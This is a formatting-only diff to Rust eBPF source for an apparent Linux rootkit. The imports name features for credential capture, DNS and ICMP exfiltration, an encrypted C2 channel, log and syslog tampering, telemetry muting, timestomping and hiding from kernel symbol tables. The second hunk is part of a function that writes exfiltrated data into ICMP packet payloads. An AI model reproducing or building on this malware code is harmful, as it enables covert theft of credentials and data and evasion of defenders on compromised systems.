@@ -13,13 +13,13 @@ use aya_ebpf::{
     programs::{ProbeContext, RetProbeContext, XdpContext},
 };
 use common::{
-    CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload,
-    RootkitConfig, TimestompEntry, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED,
-    EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED,
-    EVENT_CONTAINER_PROBE, EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL,
-    EVENT_KALLSYMS_HIDDEN, EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE,
-    EVENT_NETNS_HIDDEN, EVENT_PACKET_INTERCEPTED, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
-    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED, MAGIC_BYTES,
+    CommandPayload, CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig,
+    TimestompEntry, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH,
+    EVENT_BPF_CLOAKED, EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE,
+    EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL, EVENT_KALLSYMS_HIDDEN,
+    EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN,
+    EVENT_PACKET_INTERCEPTED, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED, EVENT_TELEMETRY_MUTED,
+    EVENT_TIMESTOMPED, MAGIC_BYTES,
 };
 use core::mem;
 
@@ -2054,7 +2054,11 @@ fn try_icmp_exfil(ctx: &aya_ebpf::programs::TcContext) -> Result<i32, i64> {
 
     // Write exfil data into ICMP payload area (after 8-byte ICMP header)
     let payload_start = icmp_start + 8;
-    let payload_len = if chunk.data_len > 56 { 56 } else { chunk.data_len as usize };
+    let payload_len = if chunk.data_len > 56 {
+        56
+    } else {
+        chunk.data_len as usize
+    };
     if payload_start + payload_len > ctx.data_end() {
         return Ok(0);
     }
